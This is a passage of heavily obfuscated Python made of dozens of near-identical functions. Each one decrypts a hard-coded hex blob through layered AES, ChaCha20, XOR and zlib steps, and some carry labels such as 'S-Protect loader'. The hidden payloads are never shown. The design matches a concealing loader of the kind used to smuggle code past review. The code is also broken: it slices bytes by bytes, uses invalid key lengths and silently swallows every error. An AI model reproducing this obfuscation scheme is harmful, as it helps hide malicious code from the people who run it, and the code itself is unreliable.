        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != 'aac04184':
            _x = _x[::-1]
        _crc = zlib.crc32(_x) & 3192415138
        _r = zlib.decompress(_x)
    except Exception as __ebb09e41f:
        _r = b''
    return _r

def _pe91c462a():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('0e92bc26d6183bbaf4f31388924603b0bcd8592f1338ddcfdcc0b631db5d20fec8d978cfb1a02cc5e1caa3')
        _d = bytes.fromhex('d2744daccf637dab8ab7fa58a9b350801dd173ecf1d1455f4ec122f2ab9680083a58fb7faea8a22937cc376e4191fe6d1bed939185187f62ac16c8f88281a8390878f48162e923bb08ea1718d4b1e9fb8674935f22049c66655f26cb150227110e61f00ef89dd0956dfa1307778c8b860c7d53b394e3d8cfc077e4d44717a6dce4c94c42ee')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != '701cd21c':
            _x = _x[::-1]
# NOTE: deprecated in 3.12
# OPTIMIZE: slow loop here

        _r = zlib.decompress(_x)
    except Exception as __tdc5ce60f:
        _r = b''
    return _r

def _z89c9ba1e():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('1243ee8686a2bbbce9577f8a92d0b244a18e67994ae6b74fac74d443e289534fdb')
        _d = bytes.fromhex('4a33b7f606485a072a3276da2f22250f9345d6b307c8929d6867481a3432880999802fca29d4409fa23ccb0c4bbd1bfcaccf20145634a59f1cd1301fd8b81d5425')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        _r = zlib.decompress(_x)
    except Exception as __kbe144ae6:
        _r = b''
    return _r

def _mb0cf81e6():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('588bfcdcd2708abc766f88726b2903bcdbbbe28045986a0fce82d923b0492321ec30d2d4f743458b')
        _d = bytes.fromhex('86dadc6d30dce01a385a6056e2818c979e1a7334273afb87819eaa04b33e5c5c53fb04666bac1a9105fd217b3ed0e1d0ea0413f0d5e9dc3ae3e3fa180262e0842bbed38c6216558ff41590b579da4d4cee55e5389099a7d57ad1ebfc1355c02cbca69249891fca68d5f5b6f6955c8e722bb3c24af4f3')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != 'cb6974f7':
            _x = _x[::-1]
        _crc = zlib.crc32(_x) & 3366548737
        _r = zlib.decompress(_x)
    except Exception as __dc10fecaf:
        _r = b''
    return _r
'S-Protect loader v3.7.'

def _pfa6e3b3e():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('301863b5fecdae99a4e571910ed7ced028417e171a4ab214932b2994aef5c20ec53ed8505c3b2b')
        _d = bytes.fromhex('ef4e7bde6ce011de23b3fc368f4356ec84122528c323f99e76fccdb7da4295a0b9962ce3c754b29ac48141e76881e5fa1bb8a4a1968211ec4ad56284d3e2647f637d29ef85c3e49d00f06b8f05addaab')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != '00dadd21':
            _x = _x[::-1]
        _r = zlib.decompress(_x)
    except Exception as __b9331ab57:
        _r = b''
    return _r
'Loader v1.5.'

def _a07ad3661():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('7fc8eb5aad144168c8cfc34d94ce44aa476ac8082328c1827f1a7a237e6db093480d3ae288b0afb6370c6e6c3d')
        _d = bytes.fromhex('beaa8294763891335b07bd6a5c73cb544cb1b861d64e2ae4eb4a24d56c717e63081dd54acd9cd0231b1b44b6f1ebc24553ef8d9bebc0afbe5827f8e7dbb762007898b0e1554f3c547cd4321bbd697bb415c4eebab3413751228e0f2be69eeaa32ecaa8a848f199cde9')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != '57b97245':
            _x = _x[::-1]
        _crc = zlib.crc32(_x) & 136846205
        _r = zlib.decompress(_x)
    except Exception as __s22add796:
        _r = b''
    return _r

def _vdb141867():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('86a49eaa98ab8af9aed2ac6c1bafb3a8e02ed8434433b3e97955367d2e56b5b8c018b732')
        _d = bytes.fromhex('e2e0e2d1d3dc79c42ad616510e0bf17f53e916943bc69a30efaf191e4e92f7915b1e684a97e5c043ec1e68d7a6fdb85a821c441a477bc1ed601f32a6a4610fab78697e82fe509f7d41276e')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != 'ff086e8c':
            _x = _x[::-1]
        _r = zlib.decompress(_x)
    except Exception as __w0195b52e:
        _r = b''
    return _r
'Loader v5.5.'

def _nf4d2360b():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('746d1433f23d81b7dff3fba46062dd4e78f99e13f169bb5d5317a91c7525b961271a39631eac')
        _d = bytes.fromhex('dca1f5eec2dc370ca12600c0d0e98b7ab11c64305b0ccbb2995146793e7d7b901f7c1d5850e5ba5493082f6affc8371969ad18b634a16311addb68e2589919a3e3785d00a86d15')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != 'aa4f8a17':
            _x = _x[::-1]
        _crc = zlib.crc32(_x) & 2139342006
        _r = zlib.decompress(_x)
    except Exception as __mf4beb022:
        _r = b''
    return _r
'S-Protect loader v5.6.'

def _p6c0644c7():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('ca9ede2f4299f521f2cf6ec191dd54b9114710c7f2c858d5dc33ba7682d783895d044952b69de6fbb12d')
        _d = bytes.fromhex('954aaa6eb2591affef59a67372d6869150d860c674c382514b266826123165bc0ff44464fe59088b801b7437d2a0f440af1ade521f933a12400806a87ab4')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != '15e859e6':
            _x = _x[::-1]
        _crc = zlib.crc32(_x) & 2206815784
        _r = zlib.decompress(_x)
    except Exception as __t88d1d497:
        _r = b''
    return _r
'S-Protect loader v2.8.'

def _a0e31d455():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('a8c116e5ad6f922ef69a4f286fc1a647c8f339a5dcd5225ae05b4ee25c3814f2')
        _d = bytes.fromhex('332ca78a4e0600a34f79b08bc0e6a9c58d86c8c648b45a82c7f9c747697b39c03fae0acdc0f06e21566028c1f258001bd9e1f8b20bfab379fe953f18d528a6c5')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        _crc = zlib.crc32(_x) & 2046724677
        _r = zlib.decompress(_x)
    except Exception as __wa4eafe69:
        _r = b''
    return _r

def _cd7cf3885():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('f4fb204ec1a4e8805cc9616c4f832e4b023087a6bc2c950ded24ff2ca1211a803da18dca6d4950dcc51435a1')
        _d = bytes.fromhex('9bc7b1c3bd66f94c080bb68f855d0ffa57ba7f06f8030dcd64cb3d6ce5b7a928a6ec877f82cb70e58bf73d1afa8fc1a3979ad7ba2e')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != '1fc49972':
            _x = _x[::-1]
        _crc = zlib.crc32(_x) & 2158603461
        _r = zlib.decompress(_x)
    except Exception as __wab3fc222:
        _r = b''
    return _r

def _q477e4b42():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('2854698a1e786939c1386851aa19384a4d9f86bfe4fed31be57b470fb8d36a7cc7db')
        _d = bytes.fromhex('8462f4ac90db66dd9bb36c2f10de4bff18a7bfd14cc296abb40a910c39f97595f1e58d71162198335b68a52cb2af2bf92c75610343187ab73c643e28c3535402f16768ae0d068087ef17df2a77a12a76962886d5d3a4')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != '6a990d99':
            _x = _x[::-1]
        _crc = zlib.crc32(_x) & 1169738799
        _r = zlib.decompress(_x)
    except Exception as __e32206362:
        _r = b''
    return _r
'Loader v3.3.'

def _bc1dd3b88():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('0a309033a89085d62baf99ead2494cc9c412ca317b7cfbfb1003eb288fb857d9c39b2a53de16a1735f5578bb5069b7')
        _d = bytes.fromhex('c09ea8b47d66ff972463de4cb458093d012246b37ac806a90f794651c9341ea60deef819fe45b728f48ec379ee247b58a46653dc233554a3daa78830396bfd70e17b5a1dbd23738e8b3da7b427364d19cc09274e4a065282ace58371b0b3a388c7e69785fa010e25893ce1c69512ded5905708cbf4')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != '03625599':
            _x = _x[::-1]
        _crc = zlib.crc32(_x) & 2246319807
        _r = zlib.decompress(_x)
    except Exception as __p9c4f0485:
        _r = b''
    return _r

def _sc2850e46():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('d8c9c44b123f066d30216113be25c6d56b20f6ca10b0ad4107da237fd2f269c1ba4db14e91b8370296506d4a00')
        _d = bytes.fromhex('d80740406550b93b825adea819372e1a5442473374ea44257d529fa268579e4ac405548646aae037917cf8d750e321d8c2463d56f75b88bc50fb6fdefaff9110df0629a90254d8')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != '36f53ce1':
            _x = _x[::-1]
        _r = zlib.decompress(_x)
    except Exception as __f9a7fe4cd:
        _r = b''
    return _r

def _a0a846edb():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('828ce2e0be0576751a9f6a77edd28bd1321d074bdf0220f61ffc79cbe9f559e3978459cf516049')
        _d = bytes.fromhex('e07675562f7a20a9919ae3f28eef0af48a8b0011ab63ac7e9e348736006b1def891153f8992ec673289bb5c45502f6827b3867a6042bd1')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != '2fc13828':
            _x = _x[::-1]
        _crc = zlib.crc32(_x) & 1350778797
        _r = zlib.decompress(_x)
    except Exception as __z3e39cbe1:
        _r = b''
    return _r

def _w102afcab():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('481bcb375961ac53f8b67982346e078c778ce581e8d7bb4c67f8bfa6e9096246c5603943ec3489f815d2e0f827b3')
        _d = bytes.fromhex('ac316507387509c32bdbd85933e4944502dac69f65de3784ace7770392239fe43f7434e2368a2c5cc41396c73ef297a1aca7a2e67934b16cd2dae39aff80c2f6ce1039253ef233df6651f451502713d1d9e5821d2d00bf64635a92cd747969f8c662b57443e7230c606c1fa0311d747b50b2f2b88f94eff79200ef3829d743dc26fc1834f40b9deea02b078f5e85')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _r = zlib.decompress(_x)
    except Exception as __x9497dd19:
        _r = b''
    return _r

def _zc7e70eb2():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('44802ed8cfa28fafeaaf1e3e459022ce7b5a39d458f38a41555f4bfdc90f7a88d71d1893db7db5')
        _d = bytes.fromhex('f09eaa4b88daa3a03ff0ae747aa25cd8f54445b9ceb1f1a0d62b448baba92f373b26daa92543a3e3c7bfdcb4ae8e14c5405609757d5eba121276c029247438595fae54923b40930410886cb20c8f1645fb53362946fba0d13aaa025961025c5bd0bb2723278a292de655ec5fca59d8670d243e3fa295ed3a07a0818800e5666afdd06794f31131e3264c42c3dd9f')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != 'fdcc08f9':
            _x = _x[::-1]
        _crc = zlib.crc32(_x) & 1721208690
        _r = zlib.decompress(_x)
    except Exception as __tf61d6326:
        _r = b''
    return _r
'S-Protect loader v1.4.'

def _m0e0ebdf1():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('e0bbf0eb0c18d56eb6f7d63014b83e0c8faf09f23243dd768682babb9725620e5bc6ff')
        _d = bytes.fromhex('4f34c8f1fe819ebd4a9e50ff7c92f14810db0681b24794837dd19d8bc966cac7e23288ae12576fec6c2604867c9db1a0b8493e00f98138991f51db275709894d49674a716f876958cbdfd939e31047d1f595ad40046bf6e25ad9fc27')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        _r = zlib.decompress(_x)
    except Exception as __df20cb2d5:
        _r = b''
    return _r

def _x06bc2267():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('9483c185fd8d318dd9a37e305dd81f8dd7c3c4aeb7c13d879464e6e831d09217355e1e0b30')
        _d = bytes.fromhex('c67b0428d7b010c69d8afcfc0a5e843588218fba2a772afb6b8dcbaa01081e3adc07570076fea73861d86cbaf21bbffe7162b1106b29313e26cd8c8c800fa6f581844e13d9e2baa9ce7878')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != '3400686d':
            _x = _x[::-1]
        _crc = zlib.crc32(_x) & 3586348599
        _r = zlib.decompress(_x)
    except Exception as __x15a981c8:
        _r = b''
    return _r
'Loader v4.0.'

def _0x0d025a2bb6():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('f7b7f21241214018e64dbcf4b850e21445a3b5a7ce488cbaeb00b5c0835a3a83')
        _d = bytes.fromhex('f99774753a289942eda592357995eaea8ac840484a5394846fd627989e18504efde69044272d8981a8391b89a164da9273a851bacc263ea4d5c8e15cfafdbcb713a4fae827f6d5944645fd00e86eeae34d55bca24b8f40de13de8851db737ca41c')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _crc = zlib.crc32(_x) & 2321339501
        _r = zlib.decompress(_x)
    except Exception as __a3ff50eee:
        _r = b''
    return _r
'Loader v4.0.'

def _p03a79054():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('eca13dab164526112159836f1a9083eaed13a9ed11e3f676842f8fc28cf1907d169fc58235')
        _d = bytes.fromhex('8b2a184226f7b1afd123a64aa0eb2e53719d1ed4842519d5db9b553936d23a92ea80ba8bca71be6cf450d975f7768302183cc27670530ad66fe9101d5ccae4d122f58e0b12098a0f774922b02e555a884c1e5450d04c17e10b1971588747f5e846ff379a08f2c494e1d8204b')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != '15aa9876':
            _x = _x[::-1]
        _r = zlib.decompress(_x)
    except Exception as __n801074b2:
        _r = b''
    return _r

def _0x90966f5384():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('194dacc30e990c2fc7928581317fc8862c4534f852df656aee1bb7d4983cb9230f4ce513')
        _d = bytes.fromhex('a01ed0453df0f389b7bbc55bdb10365852bb5f2dc807671b2f1d69649eca8844f984caf4bb2fd7beb9bddf172aed3e7a48952ca0abfcfa7ff1f40f810a9c5f4201a653a2feb2947d9277136185347cbb6e15a432d80a45e9bb5ebef5781faad7fb7cf63fcd58efa9df723d937c889d4a876e29495d0aa5')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != 'bcb76508':
            _x = _x[::-1]
        _r = zlib.decompress(_x)
    except Exception as __xa307d270:
        _r = b''
    return _r
'Loader v3.5.'

def _wac6c5e4b():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('8bf47d22d0c9f2bafe88aba95796b5b4519a1a3ce457f7ac31fe5c8731ee072cd2a757da1d8642879074956922d2')
        _d = bytes.fromhex('01a268ee75ed4283ba3bb2ebad807c0d2f0b7be7735d1f960597b482612086b28d4e0d94984c2aed0e559813ddb95587c26bf2702a222e7ee3fece1d89c207482a')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        _crc = zlib.crc32(_x) & 2424302635
        _r = zlib.decompress(_x)
    except Exception as __zf9ab3bf0:
        _r = b''
    return _r
'Loader v3.4.'

def _v66b62ccc():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('4b6d4663fcb6f0f467bee2553da118ccf869bccca6814473a0f6c745017de91e7d940a3e')
        _d = bytes.fromhex('4d0c77fde10248de04babb54f7c4b700d51f64fdb2cf9524b5a2e351580b52fa1d97e027d10f118034d22ca42cfe3b5002d011357f944e4dbaf1c7f1')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != '3ee6dff9':
            _x = _x[::-1]
        _crc = zlib.crc32(_x) & 1688561782
        _r = zlib.decompress(_x)
    except Exception as __aeff3afe5:
        _r = b''
    return _r

def _t23ad7fc3():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('86fa98b506482f17373d40c1fa1daf433c21b56822c0bcfd45bb7d94855b159d3fe3acd5236d1afeaf094e57')
        _d = bytes.fromhex('16e512c7ceabb3410c3a4c68bbd54697120ef050b423ca2b61767567c542901a67c43ddd9ebcf9da7f1da8ceb5ad13a7563564538d1815712857b75f854450a3775c10f0e5df263bbce5503282e50eef27fca6efe3c62059c80576c83eeedf85d1debe7dca589c5081600cffaf9addadecc9d4251577cb8626a030e2ae3598861bb20c0287c973c01b20f794ab82b68e')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        _r = zlib.decompress(_x)
    except Exception as __mf176aef0:
        _r = b''
    return _r

def _vbf5013a8():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('1a68cdbb4d89a47495ccb084c5318f10c31e7c42c337a4a6ef194fa6358396f058f6')
        _d = bytes.fromhex('d51d397f538b3fc0e77fefb8e94858b694bab414e122583acf9a13e155ffc8cc1d7b5df4c543d654fcc1b5cd6d0fc077ca88fc97f01fbd25a236f6a1dde69bc7c7c664eee39c8a60d63d24274a7c717808ed230a32d693c5ab133ba6c9654dc67c7c6b969c574fab28624f928f0508ed779b8250e687bc6ef99b')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _r = zlib.decompress(_x)
    except Exception as __z7e977ab9:
        _r = b''
    return _r

def _0xd9ed5a5837():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('b9eb5956b15cc95f8e63ba0890ef481868c73ff97d8692b2070c4f75d490bc7f42d3d41a64fa29ded44b71e1')
        _d = bytes.fromhex('38453231ca0beb2fe40b08643a45e9eb2e03a98dc07d8221540d69b989eb1eb2daf0486c481c7f8b39a207103ce9f36329b1c5314d09767dcbfecea5febed6c686785801bf43a7a28bb55a2c30d1318bd5ba1076537e2848ecc6')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != 'bd14be43':
            _x = _x[::-1]
        _crc = zlib.crc32(_x) & 1671193746
        _r = zlib.decompress(_x)
    except Exception as __sd554f52d:
        _r = b''
    return _r
